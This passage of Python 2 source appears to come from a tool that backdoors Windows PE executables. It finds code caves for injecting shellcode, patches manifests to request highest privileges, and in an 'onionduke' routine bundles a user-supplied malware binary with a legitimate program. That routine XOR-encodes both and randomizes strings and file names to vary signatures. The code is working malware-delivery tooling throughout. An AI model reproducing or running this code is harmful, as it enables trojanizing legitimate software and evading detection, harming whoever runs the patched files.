self.binary.seek(self.flItms['BoundImportLocation'])\n        if self.flItms['BoundImportLOCinCode'] != 0:\n            self.binary.write(struct.pack('<I', self.flItms['BoundImportLOCinCode'] + 40))\n        self.binary.seek(self.flItms['BeginSections'] +\n                         40 * self.flItms['NumberOfSections'], 0)\n        self.binary.write(self.flItms['NewSectionName'] +\n                          \"\\x00\" * (8 - len(self.flItms['NewSectionName'])))\n        self.binary.write(struct.pack('<I', self.flItms['VirtualSize']))\n        self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))\n        self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))\n        self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))\n        if self.VERBOSE is True:\n            print 'New Section PointerToRawData'\n            print self.flItms['newSectionPointerToRawData']\n        self.binary.write(struct.pack('<I', 0))\n        self.binary.write(struct.pack('<I', 0))\n        self.binary.write(struct.pack('<I', 0))\n        self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))\n        self.binary.write(self.flItms['ImportTableALL'])\n        self.binary.seek(self.flItms['filesize'] + 1, 0)  # moving to end of file\n        nop = choice(intelCore.nops)\n        if nop > 144:\n            self.binary.write(struct.pack('!H', nop) * (self.flItms['VirtualSize'] / 2))\n        else:\n            self.binary.write(struct.pack('!B', nop) * (self.flItms['VirtualSize']))\n        self.flItms['CodeCaveVirtualAddress'] = (self.flItms['SizeOfImage'] +\n                                                 self.flItms['ImageBase'])\n        self.flItms['buffer'] = int('200', 16)  # bytes\n        self.flItms['JMPtoCodeAddress'] = (self.flItms['CodeCaveVirtualAddress'] -\n                                           self.flItms['PatchLocation'] -\n                                           self.flItms['ImageBase'] - 5 +\n                                           self.flItms['buffer'])\n\n    def find_all_caves(self):\n        \"\"\"\n        This function finds all the codecaves in a inputed file.\n        Prints results to screen\n        \"\"\"\n\n        print \"[*] Looking for caves\"\n        SIZE_CAVE_TO_FIND = self.SHELL_LEN\n        BeginCave = 0\n        Tracking = 0\n        count = 1\n        caveTracker = []\n        caveSpecs = []\n        self.binary = open(self.FILE, 'r+b')\n        self.binary.seek(0)\n        # Slow way\n        while True:\n            try:\n                s = struct.unpack(\"<b\", self.binary.read(1))[0]\n            except Exception as e:\n                break\n            if s == 0:\n                if count == 1:\n                    BeginCave = Tracking\n                count += 1\n            else:\n                if count >= SIZE_CAVE_TO_FIND:\n                    caveSpecs.append(BeginCave)\n                    caveSpecs.append(Tracking)\n                    caveTracker.append(caveSpecs)\n                count = 1\n                caveSpecs = []\n\n            Tracking += 1\n\n        for caves in caveTracker:\n            for section in self.flItms['Sections']:\n                sectionFound = False\n                if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \\\n                        caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:\n                    print \"We have a winner:\", section[0]\n                    print '->Begin Cave', hex(caves[0])\n                    print '->End of Cave', hex(caves[1])\n                    print 'Size of Cave (int)', caves[1] - caves[0]\n                    print 'SizeOfRawData', hex(section[3])\n                    print 'PointerToRawData', hex(section[4])\n                    print 'End of Raw Data:', hex(section[3] + section[4])\n                    print '*' * 50\n                    sectionFound = True\n                    break\n            if sectionFound is False:\n                try:\n                    print \"No section\"\n                    print '->Begin Cave', hex(caves[0])\n                    print '->End of Cave', hex(caves[1])\n                    print 'Size of Cave (int)', caves[1] - caves[0]\n                    print '*' * 50\n                except Exception as e:\n                    print str(e)\n        print \"[*] Total of %s caves found\" % len(caveTracker)\n        self.binary.close()\n\n    def find_cave(self):\n        \"\"\"This function finds all code caves, allowing the user\n        to pick the cave for injecting shellcode.\"\"\"\n\n        self.flItms['len_allshells'] = ()\n        if self.flItms['cave_jumping'] is True:\n            for item in self.flItms['allshells']:\n                self.flItms['len_allshells'] += (len(item), )\n            # TODO: ADD Stub len for zeroing memory here\n            self.flItms['len_allshells'] += (len(self.flItms['resumeExe']), )\n            SIZE_CAVE_TO_FIND = sorted(self.flItms['len_allshells'])[0]\n        else:\n            SIZE_CAVE_TO_FIND = self.flItms['shellcode_length']\n            self.flItms['len_allshells'] = (self.flItms['shellcode_length'], )\n\n        print \"[*] Looking for caves that will fit the minimum \"\\\n              \"shellcode length of %s\" % SIZE_CAVE_TO_FIND\n        print \"[*] All caves lengths: \", ', '.join([str(i) for i in self.flItms['len_allshells']])\n        Tracking = 0\n        count = 1\n        #BeginCave=0\n        caveTracker = []\n        caveSpecs = []\n        self.binary.seek(0)\n\n        if self.PATCH_METHOD == 'automatic':\n            #  This is so much faster than the other method\n            for k, item in enumerate(sorted(self.flItms['len_allshells'])):\n                cave_buffer = \"\\x00\" * (item + 8)\n                p = re.compile(cave_buffer)\n                self.binary.seek(0)\n                for m in p.finditer(self.binary.read()):\n                    caveSpecs.append(m.start() + 4)\n                    caveSpecs.append(m.start() + item + 8)\n                    caveTracker.append(caveSpecs)\n                    caveSpecs = []\n            self.binary.seek(0)\n\n        else:\n            # Manual Slow method\n            while True:\n                # TODO: ADD in Fast Mode\n                # Jump to near end of .text section and start parsing there.\n                try:\n                    s = struct.unpack(\"<b\", self.binary.read(1))[0]\n                except:     # Exception as e:\n                    break\n                if s == 0:\n                    if count == 1:\n                        BeginCave = Tracking\n                    count += 1\n                else:\n                    if count >= SIZE_CAVE_TO_FIND:\n                        #Add a four byte buffer between objects\n                        caveSpecs.append(BeginCave + 4)\n                        caveSpecs.append(Tracking - 4)\n                        caveTracker.append(caveSpecs)\n                    count = 1\n                    caveSpecs = []\n\n                Tracking += 1\n\n        pickACave = {}\n        for i, caves in enumerate(caveTracker):\n            i += 1\n            for section in self.flItms['Sections']:\n                sectionFound = False\n                try:\n                    if caves[0] >= section[4] and \\\n                       caves[1] <= (section[3] + section[4]) and \\\n                       caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:\n                        if self.VERBOSE is True:\n                            print \"Inserting code in this section:\", section[0]\n                            print '->Begin Cave', hex(caves[0])\n                            print '->End of Cave', hex(caves[1])\n                            print 'Size of Cave (int)', caves[1] - caves[0]\n                            print 'SizeOfRawData', hex(section[3])\n                            print 'PointerToRawData', hex(section[4])\n                            print 'End of Raw Data:', hex(section[3] + section[4])\n                            print '*' * 50\n                        JMPtoCodeAddress = (section[2] + caves[0] - section[4] -\n                                            5 - self.flItms['PatchLocation'])\n\n                        sectionFound = True\n                        pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),\n                                        caves[1] - caves[0], hex(section[4]),\n                                        hex(section[3] + section[4]), JMPtoCodeAddress,\n                                        section[1], section[2]]\n                        break\n                except:\n                    print \"-End of File Found..\"\n                    break\n                if sectionFound is False:\n                    if self.VERBOSE is True:\n                        print \"No section\"\n                        print '->Begin Cave', hex(caves[0])\n                        print '->End of Cave', hex(caves[1])\n                        print 'Size of Cave (int)', caves[1] - caves[0]\n                        print '*' * 50\n\n                JMPtoCodeAddress = (section[2] + caves[0] - section[4] -\n                                    5 - self.flItms['PatchLocation'])\n                try:\n                    pickACave[i] = [None, hex(caves[0]), hex(caves[1]),\n                                    caves[1] - caves[0], None,\n                                    None, JMPtoCodeAddress]\n                except:\n                    print \"EOF\"\n\n        CavesPicked = {}\n\n        if self.PATCH_METHOD.lower() == 'automatic':\n            print \"[*] Attempting PE File Automatic Patching\"\n            availableCaves = {}\n            # Take away the rsrc restriction, solved\n            for caveNumber, caveValues in pickACave.iteritems():\n                # caveValues[0], Begin Cave, [1] End of Cave\n                # stay clear of iat_cave_loc, will be zero if never touched\n                if self.iat_cave_loc != 0:\n                    if caveValues[0] <= self.iat_cave_loc[0] <= caveValues[1]:\n                        continue\n                # stay clear of iat_cave_loc ending\n                    if caveValues[0] <= self.iat_cave_loc[1] <= caveValues[1]:\n                        continue\n                if caveValues[0] is None:\n                    continue\n                elif caveValues[3] >= 50:\n                    availableCaves[caveNumber] = caveValues[3]\n\n            #serialize caves:\n\n            payloadDict = {}\n            for k, item in enumerate(self.flItms['len_allshells']):\n                payloadDict[k] = item\n\n            # choose other Caves first.\n\n            while True:\n                # for tracking sections to change perms on\n                trackSectionName = set()\n\n                # other caves first\n                for ref in sorted(payloadDict.items(), key=operator.itemgetter(1), reverse=True):\n                    # largest first\n                    # now drop the caves that are big enough in a set\n                    # and randomly select from it\n                    _tempCaves = {}\n                    if _tempCaves == {}:\n                        # nothing? get out\n                        for refnum, caveSize in availableCaves.iteritems():\n                            if caveSize >= ref[1]:\n                                _tempCaves[refnum] = caveSize\n                        if _tempCaves == {}:\n                            break\n                    selection = choice(_tempCaves.keys())\n                    print '[!] Selected:', str(selection) + \":\", (\"Section Name: {0}; Cave begin: {1} End: {2}; \"\n                                                                  \"Cave Size: {3}; Payload Size: {4}\".format(pickACave[selection][0], pickACave[selection][1],\n                                                                                          pickACave[selection][2], pickACave[selection][3], ref[1]\n                                                                                          ))\n                    trackSectionName.add(pickACave[selection][0])\n                    #remove the selection from the dict\n                    popSet = set()\n                    for cave_ref, cave_vals in availableCaves.iteritems():\n                        if pickACave[cave_ref][1] <= pickACave[selection][1] <= pickACave[cave_ref][2] or \\\n                            pickACave[cave_ref][1] <= pickACave[selection][2] <= pickACave[cave_ref][2] or \\\n                            pickACave[selection][1] <= pickACave[cave_ref][1] <= pickACave[selection][2] or \\\n                            pickACave[selection][1] <= pickACave[cave_ref][2] <= pickACave[selection][2]:\n                            popSet.add(cave_ref)\n                    for item in popSet:\n                        availableCaves.pop(item)     \n                    if selection in availableCaves.keys():\n                        availableCaves.pop(selection)\n                    CavesPicked[ref[0]] = pickACave[selection]\n                break\n\n            if len(CavesPicked) != len(self.flItms['len_allshells']):\n                print \"[!] Did not find suitable caves - trying next method\"\n                if self.flItms['cave_jumping'] is True:\n                    return 'single'\n                else:\n                    return 'append'\n\n            if self.CHANGE_ACCESS is True:\n                for cave in trackSectionName:\n                    self.change_section_flags(cave)\n\n        elif self.PATCH_METHOD.lower() == 'manual':\n            print (\"############################################################\\n\"\n                   \"The following caves can be used to inject code and possibly\\n\"\n                   \"continue execution.\\n\"\n                   \"**Don't like what you see? Use jump, single, append, or ignore.**\\n\"\n                   \"############################################################\")\n\n            for k, item in enumerate(self.flItms['len_allshells']):\n                print \"[*] Cave {0} length as int: {1}\".format(k + 1, item)\n                print \"[*] Available caves: \"\n\n                if pickACave == {}:\n                    print \"[!!!!] No caves available! Use 'j' for cave jumping or\"\n                    print \"[!!!!] 'i' or 'q' for ignore.\"\n                for ref, details in pickACave.iteritems():\n                    if details[3] >= item:\n                        print str(ref) + \".\", (\"Section Name: {0}; Section Begin: {4} \"\n                                               \"End: {5}; Cave begin: {1} End: {2}; \"\n                                               \"Cave Size: {3}\".format(details[0], details[1], details[2],\n                                                                       details[3], details[4], details[5],\n                                                                       details[6]))\n\n                while True:\n                    try:\n                        self.CAVE_MINER_TRACKER\n                    except:\n                        self.CAVE_MINER_TRACKER = 0\n\n                    print \"*\" * 50\n\n                    selection = raw_input(\"[!] Enter your selection: \")\n                    try:\n                        selection = int(selection)\n\n                        print \"[!] Using selection: %s\" % selection\n                        try:\n                            if self.CHANGE_ACCESS is True:\n                                if pickACave[selection][0] is not None:\n                                    self.change_section_flags(pickACave[selection][0])\n                            CavesPicked[k] = pickACave[selection]\n                            break\n                        except:\n                            print \"[!!!!] User selection beyond the bounds of available caves.\"\n                            print \"[!!!!] Try a number or the following commands:\"\n                            print \"[!!!!] append or a, jump or j, ignore or i, single or s\"\n                            print \"[!!!!] TRY AGAIN.\"\n                            continue\n                    except:\n                        pass\n                    breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i', 'q']\n                    if selection.lower() in breakOutValues:\n                        return selection\n        else:\n            print \"[!] Invalid Patching Method\"\n            return None\n        return CavesPicked\n\n    def runas_admin(self):\n        \"\"\"\n        This module jumps to .rsrc section and checks for\n        the following string: requestedExecutionLevel level=\"highestAvailable\"\n\n        \"\"\"\n        #g = open(flItms['filename'], \"rb\")\n        result = False\n        print \"[*] Checking Execution Level\"\n        if 'rsrcPointerToRawData' in self.flItms:\n            search_lngth = len('requestedExecutionLevel level=\"highestAvailable\"')\n            data_read = 0\n            while data_read < (self.flItms['rsrcPointerToRawData'] +\n                               self.flItms['rsrcSizeRawData'] -\n                               self.flItms['manifestLOC']):\n                self.binary.seek(self.flItms['manifestLOC'] + data_read, 0)\n                temp_data = self.binary.read(search_lngth)\n                if temp_data == 'requestedExecutionLevel level=\"highestAvailable\"':\n                    result = True\n                    break\n                data_read += 1\n\n        if result is True:\n            print \"[*] %s must run with highest available privileges\" % self.FILE\n        else:\n            print \"[*] %s does not require highest available privileges\" % self.FILE\n\n        return result\n\n    def patch_runlevel(self):\n        \"\"\"\n        This module jumps to .rsrc section and checks for\n        the following string: requestedExecutionLevel level=\"highestAvailable\"\n        and if not there patches it in\n\n        \"\"\"\n        #g = open(flItms['filename'], \"rb\")\n        result = False\n        print \"[*] Checking execution Level\"\n        if 'rsrcPointerToRawData' in self.flItms:\n            search_lngth = len('requestedExecutionLevel')\n            data_read = 0\n            found_exeLevel = True\n            while data_read < (self.flItms['rsrcPointerToRawData'] +\n                               self.flItms['rsrcSizeRawData'] -\n                               self.flItms['manifestLOC']):\n                self.binary.seek(self.flItms['manifestLOC'] + data_read, 0)\n                temp_data = self.binary.read(search_lngth)\n                if temp_data == 'requestedExecutionLevel':\n                    found_exeLevel = True\n                    search_lngth = len('level=')\n                    if self.binary.read(search_lngth + 1) == ' level=':\n                        if self.binary.read(len(\"\\\"highestAvailable\\\"\")) == \"\\\"highestAvailable\\\"\":\n                            print \"[*] File already set to highestAvailable execution level\"\n                            break\n                        else:\n                            print \"[!] Patching 'highestAvailable' in PE Manifest\"\n                            self.binary.seek(self.flItms['manifestLOC'] + data_read + len(temp_data) + search_lngth + 1, 0)\n                            self.binary.write(\"\\\"highestAvailable\\\"\")\n                            result = True\n                            while True:\n                                reading_position = self.binary.tell()\n                                if self.binary.read(1) != \">\":  # end of the xml block\n                                    self.binary.seek(reading_position)\n                                    self.binary.write(\"\\x20\")\n                                else:\n                                    return True\n                                    break\n                if temp_data == 'level=' and found_exeLevel is True:\n                    #this is what I call a spread out manifest\n                    if self.binary.read(len(\"\\\"highestAvailable\\\"\")) == \"\\\"highestAvailable\\\"\":\n                        print \"[*] File already set to highestAvailable execution level\"\n                        break\n                    else:\n                        print \"[!] Patching 'highestAvailable' in PE Manifest\"\n                        self.binary.seek(self.flItms['manifestLOC'] + data_read + len(temp_data), 0)\n                        self.binary.write(\"\\\"highestAvailable\\\"\")\n                        result = True\n\n                data_read += 1\n\n        return result\n\n    def parse_rsrc(self):\n        '''\n        This parses a .rsrc section for quick modification\n        '''\n        self.rsrc_structure = {}\n\n        def parse_header():\n            return {\"Characteristics\": struct.unpack(\"<I\", self.binary.read(4))[0],\n                    \"TimeDataStamp\": struct.unpack(\"<I\", self.binary.read(4))[0],\n                    \"MajorVersion\": struct.unpack(\"<H\", self.binary.read(2))[0],\n                    \"MinorVersion\": struct.unpack(\"<H\", self.binary.read(2))[0],\n                    \"NumberOfNamedEntries\": struct.unpack(\"<H\", self.binary.read(2))[0],\n                    \"NumberofIDEntries\": struct.unpack(\"<H\", self.binary.read(2))[0],\n                    }\n\n        def merge_two_dicts(x, y):\n            '''Given two dicts, merge them into a new dict as a shallow copy.'''\n            z = x.copy()\n            z.update(y)\n            return z\n\n        def parse_data_entry():\n            return {\"WriteME\": self.binary.tell(),\n                    \"RVA of Data\": struct.unpack(\"<I\", self.binary.read(4))[0],\n                    \"Size\": struct.unpack(\"<I\", self.binary.read(4))[0],\n                    \"CodePage\": struct.unpack(\"<I\", self.binary.read(4))[0],\n                    \"Reserved\": struct.unpack(\"<I\", self.binary.read(4))[0]\n                    }\n\n        def parse_ID(number):\n            temp = {}\n            for i in range(0, number):\n                _tempid = struct.unpack(\"<I\", self.binary.read(4))[0]\n                temp[_tempid] = struct.unpack(\"<I\", self.binary.read(4))[0]\n            return temp\n\n        #parse initial header\n        if \"rsrcPointerToRawData\" not in self.flItms:\n            return False\n        self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)\n        self.rsrc_structure['Typeheader'] = parse_header()\n        self.rsrc_structure['Typeheader']['NameEntries'] = {}\n        self.rsrc_structure['Typeheader'][\"IDentries\"] = {}\n\n        if self.rsrc_structure['Typeheader'][\"NumberofIDEntries\"]:\n            self.rsrc_structure['Typeheader'][\"IDentries\"] = parse_ID(self.rsrc_structure['Typeheader'][\"NumberofIDEntries\"])\n        if self.rsrc_structure['Typeheader'][\"NumberOfNamedEntries\"]:\n            self.rsrc_structure['Typeheader']['NameEntries'] = parse_ID(self.rsrc_structure['Typeheader']['NumberOfNamedEntries'])\n\n        #merge, flatten\n        self.rsrc_structure['Typeheader']['Entries'] = merge_two_dicts(self.rsrc_structure['Typeheader'][\"IDentries\"],\n                                                                       self.rsrc_structure['Typeheader']['NameEntries'])\n\n        for entry, value in self.rsrc_structure['Typeheader'][\"Entries\"].iteritems():\n            if entry == 24:  # 24 is the Manifest resource\n                self.binary.seek(self.flItms['rsrcPointerToRawData'] + (value & 0xffffff), 0)\n\n                self.rsrc_structure[entry] = parse_header()\n                self.rsrc_structure[entry][\"IDs\"] = {}\n                self.rsrc_structure[entry][\"Names\"] = {}\n\n                if self.rsrc_structure[entry][\"NumberofIDEntries\"]:\n                    self.rsrc_structure[entry][\"IDs\"] = parse_ID(self.rsrc_structure[entry][\"NumberofIDEntries\"])\n\n                if self.rsrc_structure[entry][\"NumberOfNamedEntries\"]:\n                    self.rsrc_structure[entry][\"Names\"] = parse_ID(self.rsrc_structure[entry][\"NumberOfNamedEntries\"])\n\n                self.rsrc_structure[entry][\"NameIDs\"] = merge_two_dicts(self.rsrc_structure[entry][\"IDs\"],\n                                                                        self.rsrc_structure[entry][\"Names\"])\n\n                #Now get language\n                for name_id, offset in self.rsrc_structure[entry][\"NameIDs\"].iteritems():\n                    self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offset & 0xffffff), 0)\n                    self.rsrc_structure[name_id] = parse_header()\n                    self.rsrc_structure[name_id][\"IDs\"] = {}\n                    self.rsrc_structure[name_id][\"Names\"] = {}\n\n                    if self.rsrc_structure[name_id][\"NumberofIDEntries\"]:\n                        self.rsrc_structure[name_id][\"IDs\"] = parse_ID(self.rsrc_structure[name_id][\"NumberofIDEntries\"])\n\n                    if self.rsrc_structure[name_id][\"NumberOfNamedEntries\"]:\n                        self.rsrc_structure[name_id][\"Names\"] = parse_ID(self.rsrc_structure[name_id][\"NumberOfNamedEntries\"])\n\n                    self.rsrc_structure[name_id][\"language\"] = merge_two_dicts(self.rsrc_structure[name_id][\"IDs\"],\n                                                                               self.rsrc_structure[name_id][\"Names\"])\n\n                    #now get Data Entry Details and write\n                    for lanID, offsetDataEntry in self.rsrc_structure[name_id][\"language\"].iteritems():\n                        self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offsetDataEntry & 0xffffff), 0)\n                        self.rsrc_structure[lanID] = parse_data_entry()\n                    #Jump to Manifest\n                    self.flItms['manifestLOC'] = (self.flItms['rsrcPointerToRawData'] +\n                                                 (self.rsrc_structure[lanID][\"RVA of Data\"] -\n                                                  self.flItms['rsrcVirtualAddress']))\n\n                    return True\n        return False\n\n    def support_check(self):\n        \"\"\"\n        This function is for checking if the current exe/dll is\n        supported by this program. Returns false if not supported,\n        returns flItms if it is.\n        \"\"\"\n        print \"[*] Checking if binary is supported\"\n        self.flItms['supported'] = False\n        #convert to with open FIX\n        with open(self.FILE, \"r+b\") as self.binary:\n            if self.binary.read(2) != \"\\x4d\\x5a\":\n                print \"%s not a PE File\" % self.FILE\n                return False\n            if self.gather_file_info_win() is False and self.PATCH_METHOD != \"onionduke\":\n                print \"[!] Failure during gathering file info.\"\n                return False\n            if self.flItms is False:\n                return False\n            if MachineTypes[hex(self.flItms['MachineType'])] not in supported_types:\n                for item in self.flItms:\n                    print item + ':', self.flItms[item]\n                print (\"This program does not support this format: %s\"\n                       % MachineTypes[hex(self.flItms['MachineType'])])\n            else:\n                self.flItms['supported'] = True\n            targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)\n\n            if (self.flItms['Characteristics'] % 0x4000) - 0x2000 > 0 and self.flItms['DllCharacteristics'] > 0 \\\n               and self.PATCH_DLL is False:\n                print \"[!] DLL patching not enabled\"\n                return False\n\n            if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):\n                #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64':\n                targetFile.pe64_entry_instr()\n            elif self.flItms['Magic'] == int('10b', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):\n                #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32':\n                targetFile.pe32_entry_instr()\n            else:\n                self.flItms['supported'] = False\n\n            if self.flItms['BoundImportSize'] != 0:\n                print \"[!] No support for Bound Imports at this time\"\n                return False\n\n            if self.RUNAS_ADMIN is True and self.SUPPORT_CHECK is True:\n                self.parse_rsrc()\n                if 'manifestLOC' in self.flItms:\n                    self.flItms['runas_admin'] = self.runas_admin()\n                else:\n                    print '[!] No manifest in rsrc'\n\n            if self.VERBOSE is True:\n                self.print_flItms(self.flItms)\n\n            if self.flItms['supported'] is False:\n                return False\n\n    def onionduke(self):\n\n        if not any(chiptype not in \"armv\" for chiptype in subprocess.check_output([\"uname\", \"-a\"]).lower()):\n            print \"[!] Only x86 and x86_64 chipset is supported for OnionDuke due to aPLib support\"\n            return False\n        if 'rsrcSectionName' not in self.flItms:\n            print \"[!] Missing rsrc section, not patching bianry\"\n            return False\n\n        if not self.SUPPLIED_BINARY:\n            print \"[!] No malware provided\"\n            return False\n\n        od_stub = cStringIO.StringIO()\n\n        stubPath = os.path.dirname(os.path.abspath(onionduke.__file__))\n\n        with open(self.FILE, \"r+b\") as self.binary:\n            #check if OnionDuke Stub\n            self.binary.seek(0x5C0, 0)\n            if self.binary.read(11) == \"\\x57\\xE8\\xE4\\x10\\x00\\x00\\x8B\\x15\\x2C\\x20\\x41\":\n                print \"[!!!!] Attempting to Patch an OnionDuke wrapped binary\"\n                print \"[*] Compressing\", self.SUPPLIED_BINARY, \"with aPLib\"\n                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))\n                subprocess.check_output(['appack', \"c\", self.SUPPLIED_BINARY, compressedbin])\n                # key 0x1FE37D3E\n                self.binary.seek(0x413, 0)\n                xor_key1 = struct.unpack(\"<I\", self.binary.read(4))[0]\n\n                self.binary.seek(0x429, 0)\n                xor_key2 = struct.unpack(\"<I\", self.binary.read(4))[0]\n                if xor_key2 == xor_key1:\n                    xorkey = xor_key1\n                    print \"[*] Xor'ing\", self.SUPPLIED_BINARY, \"with key:\", hex(xorkey)\n                    with open(compressedbin, 'r') as compressedBinary:\n                        xorBinary = cStringIO.StringIO()\n                        xor_file(compressedBinary, xorBinary, xorkey)\n                    os.remove(compressedbin)\n                else:\n                    print \"[*] Malformed OnionDuke Sample\"\n                    return False\n                xorBinary.seek(0)\n                #get size and location of OD malware\n                self.binary.seek(0xfd3c, 0)\n                self.od_begin_malware = struct.unpack(\"<I\", self.binary.read(4))[0]\n                self.binary.seek(0)\n                print \"[!] Removing original malware from binary.\"\n                new_stub = self.binary.read(self.od_begin_malware)\n                new_stub += xorBinary.read()\n                od_stub.write(new_stub)\n                self.od_end_malware = od_stub.tell()\n                self.od_size_malware = xorBinary.tell()\n                print \"[*] Appending compressed user supplied binary after target binary\"\n                od_stub.seek(0xfd40, 0)\n                od_stub.write(struct.pack(\"<I\", self.od_size_malware))\n\n            else:\n                od_stub.write(open(stubPath + \"/OD_stub.exe\", 'r').read())\n                #copy rsrc to memory\n                self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)\n                self.rsrc_section = cStringIO.StringIO()\n                print \"[*] Copying rsrc section\"\n                self.rsrc_section.write(self.binary.read(self.flItms['rsrcSizeRawData']))\n                self.rsrc_section.seek(0)\n                print \"[*] Updating\", self.FILE, \"rsrc section\"\n                write_rsrc(self.rsrc_section, self.flItms['rsrcVirtualAddress'], 0x16000)\n                self.rsrc_section.seek(0)\n                self.od_rsrc_begin = od_stub.tell()\n                print \"[*] Adding\", self.FILE, \"rsrc to OnionDuke stub\"\n                od_stub.write(self.rsrc_section.read())\n                self.od_binary_begin = od_stub.tell()\n\n                #compress\n                print \"[*] Compressing\", self.FILE, \"with aPLib\"\n                #USE Tempfile\n                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))\n                subprocess.check_output(['appack', \"c\", self.FILE, compressedbin])\n\n                xorkey = random.randint(0, 4294967295)\n                print \"[*] Xor'ing\", self.FILE, \"with key:\", hex(xorkey)\n                with open(compressedbin, 'r') as compressedBinary:\n                    xorBinary = cStringIO.StringIO()\n                    xor_file(compressedBinary, xorBinary, xorkey)\n                xorBinary.seek(0)\n                print \"[*] Appending compressed binary after rsrc section\"\n                od_stub.write(xorBinary.read())\n                self.od_begin_malware = od_stub.tell()\n                os.remove(compressedbin)\n\n                print \"[*] Compressing\", self.SUPPLIED_BINARY, \"with aPLib\"\n                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))\n                subprocess.check_output(['appack', \"c\", self.SUPPLIED_BINARY, compressedbin])\n\n                print \"[*] Xor'ing\", self.SUPPLIED_BINARY, \"with key:\", hex(xorkey)\n                with open(compressedbin, 'r') as compressedBinary:\n                    xorBinary = cStringIO.StringIO()\n                    xor_file(compressedBinary, xorBinary, xorkey)\n                xorBinary.seek(0)\n                print \"[*] Appending compressed user supplied binary after target binary\"\n                od_stub.write(xorBinary.read())\n                self.od_end_malware = od_stub.tell()\n                os.remove(compressedbin)\n\n                # update size of image remember to round up the next Section Alignment\n                od_stub.seek(0x138, 0)\n\n                if ((0x16000 + self.flItms['rsrcVirtualSize']) % self.flItms['SectionAlignment']) != 0:\n                    size = ((0x16000 + self.flItms['rsrcVirtualSize']) -\n                            ((0x16000 + self.flItms['rsrcVirtualSize']) % self.flItms['SectionAlignment'])\n                            + self.flItms['SectionAlignment']\n                            )\n                else:\n                    size = 0x16000 + self.flItms['rsrcVirtualSize']\n\n                # UPDATE STUB\n                od_stub.write(struct.pack(\"<I\", size))\n                # update Resource Table in optional header SIZE\n                od_stub.seek(0x174, 0)\n                od_stub.write(struct.pack(\"<I\", self.flItms['rsrcSizeRawData']))\n\n                # update .rsrc\n                od_stub.seek(0x288, 0)\n                od_stub.write(struct.pack(\"<I\", self.flItms['rsrcVirtualSize']))\n                od_stub.seek(0x290, 0)\n                od_stub.write(struct.pack(\"<I\", self.flItms['rsrcSizeRawData']))\n\n                #random string in .rdata\n                od_stub.seek(0xD250, 0)\n                od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)\n                              for _ in range(random.randint(6, 12))))\n\n                #random string in .reloc\n                od_stub.seek(0x107F0, 0)\n                od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)\n                              for _ in range(random.randint(6, 12))))\n                # update data section\n                od_stub.seek(0xfc28, 0)\n                od_stub.write(struct.pack(\"<I\", self.od_binary_begin))\n                od_stub.write(struct.pack(\"<I\", self.od_begin_malware - self.od_binary_begin))\n\n            # update xor key in all places (two)\n            od_stub.seek(0x413, 0)\n            od_stub.write(struct.pack(\"<I\", xorkey))\n            od_stub.seek(0x429, 0)\n            od_stub.write(struct.pack(\"<I\", xorkey))\n\n            od_stub.seek(0xfd3c, 0)\n            od_stub.write(struct.pack(\"<I\", self.od_begin_malware))\n            od_stub.write(struct.pack(\"<I\", self.od_end_malware - self.od_begin_malware))\n\n            #update dropped file names\n            od_stub.seek(0xfb20, 0)\n            od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)\n                          for _ in range(random.randint(6, 12))))\n\n            od_stub.seek(0xfc34, 0)\n            _temp_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(4, 8)))\n            _temp_name += \".exe\"\n            od_stub.write(_temp_name)\n\n            \n        #check submitted file to see if it is a DLL:\n        with open(self.SUPPLIED_BINARY, 'r') as self.binary:\n            print \"[?] Checking if user supplied is a DLL\"\n            self.gather_file_info_win()\n\n            #Check if DLL\n            if (self.flItms['Characteristics'] % 0x4000) - 0x2000 > 0 and self.flItms['DllCharacteristics'] > 0:\n                print \"[!] User supplied malware is a DLL!\"\n                print \"[*] Patching OnionDuke Stub for DLL usage\"\n                self.binary.seek(0)\n                #patch for dll\n                od_stub.seek(0xfd38, 0)\n                od_stub.write(\"\\x01\\x00\\x00\\x00\")\n\n                #read within a export location for speed.\n                for section in reversed(self.flItms['Sections']):\n                    if self.flItms['ExportTableRVA'] >= section[2]:\n                        #go to exact export directory location\n                        self.binary.seek((self.flItms['ExportTableRVA'] - section[2]) + section[4])\n                        break\n\n                #read the Image Export Directory for printMessage\n                if 'printMessage' not in self.binary.read(self.flItms['ExportTableSize']):\n                    #use ordinal #1\n                    od_stub.seek(0xfd44, 0)\n                    od_stub.write(\"\\x01\\x00\\x00\\x00\")\n            else:\n                print \"[*] User supplied malware is not a DLL\"\n\n        # write to file\n        od_stub.seek(0)\n        open(self.OUTPUT, 'w').write(od_stub.read())\n        with open(self.OUTPUT, 'r+b') as self.binary:\n            self.gather_file_info_win()\n            if self.RUNAS_ADMIN is True:\n                if self.parse_rsrc() is True:\n                    patch_result = self.patch_runlevel()\n                    if patch_result is False:\n                        print \"[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist\"\n                else:\n                    print '[!] No manifest in rsrc'\n\n        return True\n\n    def remove_signing(self):\n        \"\"\"\n        Zero cert table and truncate binary\n        \"\"\"\n        if self.ZERO_CERT 